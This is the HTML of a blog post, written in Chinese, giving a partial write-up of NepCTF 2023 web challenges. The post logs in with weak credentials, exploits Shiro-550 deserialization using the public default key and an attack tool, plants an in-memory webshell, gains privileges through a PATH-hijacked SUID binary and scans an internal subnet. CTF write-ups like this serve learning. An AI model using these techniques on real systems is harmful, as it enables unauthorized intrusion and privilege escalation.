@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="ez_java_checkin题目来源NepCTF2023-ez_java_checkin 考点shiro550反序列化 题目内容进入之后  弱口令admin admin登录管理员，发现rememberme字段，判断为shiro反序列化 管理员： 1rememberme：MOTxEj+Cpb97nTWsgAl7OWPq7efd60ZYeSX9PUxlSDrcbbbrOFVXJUwlS2BvQ5iI">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NepCTF-2023-web部分writeup">
+<meta property="og:url" content="http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/index.html">
+<meta property="og:site_name" content="psych&#39;s blog">
+<meta property="og:description" content="ez_java_checkin题目来源NepCTF2023-ez_java_checkin 考点shiro550反序列化 题目内容进入之后  弱口令admin admin登录管理员，发现rememberme字段，判断为shiro反序列化 管理员： 1rememberme：MOTxEj+Cpb97nTWsgAl7OWPq7efd60ZYeSX9PUxlSDrcbbbrOFVXJUwlS2BvQ5iI">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/111-1024x334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/112-1024x473.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/113-1024x99.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/114.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/115-1024x317.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/116.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/117.png">
+<meta property="article:published_time" content="2023-08-28T17:32:12.000Z">
+<meta property="article:modified_time" content="2023-09-15T21:08:44.829Z">
+<meta property="article:author" content="psych">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/111-1024x334.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>NepCTF-2023-web部分writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Article</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/08/29/nssctf-2023-%E9%83%A8%E5%88%86writeup/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/08/23/%E6%9D%AD%E5%B7%9E/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/&text=NepCTF-2023-web部分writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/&title=NepCTF-2023-web部分writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/&is_video=false&description=NepCTF-2023-web部分writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NepCTF-2023-web部分writeup&body=Check out this article: http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/&title=NepCTF-2023-web部分writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/&title=NepCTF-2023-web部分writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/&title=NepCTF-2023-web部分writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/&title=NepCTF-2023-web部分writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/&name=NepCTF-2023-web部分writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/&t=NepCTF-2023-web部分writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-java-checkin"><span class="toc-number">1.</span> <span class="toc-text">ez_java_checkin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90"><span class="toc-number">1.1.</span> <span class="toc-text">题目来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%86%85%E5%AE%B9"><span class="toc-number">1.3.</span> <span class="toc-text">题目内容</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8B%AC%E6%AD%A5%E5%A4%A9%E4%B8%8B"><span class="toc-number">2.</span> <span class="toc-text">独步天下</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90-1"><span class="toc-number">2.1.</span> <span class="toc-text">题目来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9-1"><span class="toc-number">2.2.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8B%AC%E6%AD%A5%E5%A4%A9%E4%B8%8B-%E8%BD%AC%E7%94%9F%E6%88%90%E4%B8%BA%E9%95%9C%E8%8A%B1%E6%B0%B4%E6%9C%88%E4%B8%AD%E7%9A%84%E7%8E%8B%E8%80%85"><span class="toc-number">2.3.</span> <span class="toc-text">独步天下-转生成为镜花水月中的王者</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">2.3.2.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8B%AC%E6%AD%A5%E5%A4%A9%E4%B8%8B-%E7%A0%B4%E9%99%A4%E8%99%9A%E5%A6%84-%E6%8E%A2%E8%A7%81%E7%9C%9F%E5%AE%9E"><span class="toc-number">2.4.</span> <span class="toc-text">独步天下-破除虚妄_探见真实</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        NepCTF-2023-web部分writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">psych</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-08-28T17:32:12.000Z" class="dt-published" itemprop="datePublished">2023-08-29</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="ez-java-checkin"><a href="#ez-java-checkin" class="headerlink" title="ez_java_checkin"></a>ez_java_checkin</h1><h2 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h2><p>NepCTF2023-<strong>ez_java_checkin</strong></p>
+<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>shiro550反序列化</p>
+<h2 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h2><p>进入之后</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/111-1024x334.png"></p>
+<p>弱口令admin admin登录管理员，发现rememberme字段，判断为shiro反序列化</p>
+<p>管理员：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rememberme：MOTxEj+Cpb97nTWsgAl7OWPq7efd60ZYeSX9PUxlSDrcbbbrOFVXJUwlS2BvQ5iIiHhj2D162GgzUCkhL5AQ5Io++M0gBdfBqT9yHXSSgGn/LLvyZAoq/9wTNeB5txSBuEKe6nxY0NW0cpnkwguPd0jgQIHiM5PxTT/bAJFarV0QPkKVc8oJz94IUTZRUfV+7zii7LduVumSTKlO6lSTbkGys1m91kutnYW8q48+LPcQkEKBvShgBM8r+fNId87yy3mAHXGd0hQ0vEsyqnlziIGphrvw5qkbgfDCQ2oZPO/zQgosiQhZ24Sq55kDX7lmtEKp2Og+HTfR+snXiU3FE0NC/l8k/3gFNrXO1jpdgFgl56k2C/wd+lqfddXPUrT8i6SrkmIR4NZrNKRLL0xHm/shahhVSIw/tLGEiPtUSnt7X0OADQPrjIupxO37VzRAkBkedyDHP7iE8p7sxa8Si6r/OTZkUHgIOadq5MNNZlIsBQK8gZH3ecw7mYIsj+CaWrsA3NUa9neFraH6eGMW0w==</span><br></pre></td></tr></table></figure>
+
+<p>使用工具：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SummerSec/ShiroAttack2">https://github.com/SummerSec/ShiroAttack2</a></p>
+<hr>
+<p>呃呃环境没了，本地部署一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar  ShiroSpring-0.0.1-SNAPSHOT.jar  --server.port=81</span><br></pre></td></tr></table></figure>
+
+<p>访问127.0.0.1:81</p>
+<hr>
+<p>关于密钥，这个工具 密钥爆破不出来，实际上就是默认密钥</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/112-1024x473.png"></p>
+<p>密钥：kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</p>
+<p>利用链用工具爆破</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/113-1024x99.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/114.png"></p>
+<p>直接用工具注内存马了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/115-1024x317.png"></p>
+<p>蚁剑连接的时候注意一下因为是java的所以是jsp连接不是PHP。</p>
+<hr>
+<p>蚁剑连上之后发现没有权限读取flag，需要提权</p>
+<p>使用 SUID 提权</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86979">https://www.anquanke.com/post/id/86979</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/116.png"></p>
+<hr>
+<p>有一个非预期：start.sh里面有flag，不需要提权。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/117.png"></p>
+<h1 id="独步天下"><a href="#独步天下" class="headerlink" title="独步天下"></a>独步天下</h1><h2 id="题目来源-1"><a href="#题目来源-1" class="headerlink" title="题目来源"></a>题目来源</h2><p>NepCTF2023-<strong>独步天下-转生成为镜花水月中的王者+独步天下-破除虚妄_探见真实+独步天下-破除试炼_加冕成王</strong></p>
+<h2 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h2><p>SUID提权+内网渗透+反弹shell</p>
+<h2 id="独步天下-转生成为镜花水月中的王者"><a href="#独步天下-转生成为镜花水月中的王者" class="headerlink" title="独步天下-转生成为镜花水月中的王者"></a><strong>独步天下-转生成为镜花水月中的王者</strong></h2><h3 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h3><p>hint：环境变量提权</p>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>nc 连接</p>
+<p>首先尝试SUID提权，查找有suid的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ find / -user root -perm /4000 2&gt;/tmp/err</span><br><span class="line">/bin/nmap</span><br></pre></td></tr></table></figure>
+
+<p>flag 没权限读</p>
+<p>有出网，无dns，本地有nmap</p>
+<p>nmap有suid</p>
+<p>利用nmap提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp $ nmap -h</span><br><span class="line">nmap -h</span><br><span class="line">sh: ports-alive: not found</span><br></pre></td></tr></table></figure>
+
+<p>nmap应该不是正常nmap，会直接执行 ports-alive</p>
+<p>进入&#x2F;tmp目录修改环境变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/tmp $ echo $PATH</span><br><span class="line">echo $PATH</span><br><span class="line">/sbin:/usr/sbin:/bin:/usr/bin</span><br><span class="line"></span><br><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure>
+
+<p>写入ports-alive</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/tmp $ cat &lt;&lt; EOF &gt; ports-alive</span><br><span class="line">cat &lt;&lt; EOF &gt; ports-alive</span><br><span class="line">&gt; #!/bin/sh</span><br><span class="line">#!/bin/sh</span><br><span class="line">&gt; cat /flag</span><br><span class="line">cat /flag</span><br><span class="line">&gt; EOF</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+
+<p>注意还要执行权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -h</span><br><span class="line">sh: ports-alive: Permission denied</span><br><span class="line">/tmp $ chmod 777 ports-alive</span><br><span class="line">chmod 777 ports-alive</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在 &#x2F;tmp 目录执行 nmap -h</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/tmp $ nmap -h</span><br><span class="line">nmap -h</span><br><span class="line">假作真时真亦假,真作假时假亦真</span><br><span class="line">flag&#123;Everything_is_illusory&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="独步天下-破除虚妄-探见真实"><a href="#独步天下-破除虚妄-探见真实" class="headerlink" title="独步天下-破除虚妄_探见真实"></a><strong>独步天下-破除虚妄_探见真实</strong></h2><p>接上一题的环境</p>
+<p>Hint <code>ports-alive 修正后扫描网段 （ip范围0到100）用基础get包探测获取html echo -e &quot;GET / HTTP/1.1\\r\\nHost: 192.168.200.1\\r\\n\\r\\n&quot; nc xx xx</code></p>
+<p>可以出网，刚开始想上传一个fscan扫描，结果扫出一个80端口然后内存不够fscan被杀了，就只能根据提示，修正nmap扫描。</p>
+<p>先查看ip：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/tmp $ ip a</span><br><span class="line">ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000</span><br><span class="line">    link/ether 52:54:00:12:34:56 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.200.2/24 brd 192.168.200.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::5054:ff:fe12:3456/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop qlen 1000</span><br><span class="line">    link/sit 0.0.0.0 brd 0.0.0.0</span><br></pre></td></tr></table></figure>
+
+<p>扫描 192.168.200.2&#x2F;24 网段</p>
+<p>发现一个端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.200.1:82</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>82 部署了一个上传服务，frp出来看看</p>
+<hr>
+<p>后续有空再更新。。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Article</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-java-checkin"><span class="toc-number">1.</span> <span class="toc-text">ez_java_checkin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90"><span class="toc-number">1.1.</span> <span class="toc-text">题目来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%86%85%E5%AE%B9"><span class="toc-number">1.3.</span> <span class="toc-text">题目内容</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8B%AC%E6%AD%A5%E5%A4%A9%E4%B8%8B"><span class="toc-number">2.</span> <span class="toc-text">独步天下</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90-1"><span class="toc-number">2.1.</span> <span class="toc-text">题目来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9-1"><span class="toc-number">2.2.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8B%AC%E6%AD%A5%E5%A4%A9%E4%B8%8B-%E8%BD%AC%E7%94%9F%E6%88%90%E4%B8%BA%E9%95%9C%E8%8A%B1%E6%B0%B4%E6%9C%88%E4%B8%AD%E7%9A%84%E7%8E%8B%E8%80%85"><span class="toc-number">2.3.</span> <span class="toc-text">独步天下-转生成为镜花水月中的王者</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">2.3.2.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8B%AC%E6%AD%A5%E5%A4%A9%E4%B8%8B-%E7%A0%B4%E9%99%A4%E8%99%9A%E5%A6%84-%E6%8E%A2%E8%A7%81%E7%9C%9F%E5%AE%9E"><span class="toc-number">2.4.</span> <span class="toc-text">独步天下-破除虚妄_探见真实</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/&text=NepCTF-2023-web部分writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/&title=NepCTF-2023-web部分writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/&is_video=false&description=NepCTF-2023-web部分writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NepCTF-2023-web部分writeup&body=Check out this article: http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/&title=NepCTF-2023-web部分writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/&title=NepCTF-2023-web部分writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/&title=NepCTF-2023-web部分writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/&title=NepCTF-2023-web部分writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/&name=NepCTF-2023-web部分writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/&t=NepCTF-2023-web部分writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2024
+    psych
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Article</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
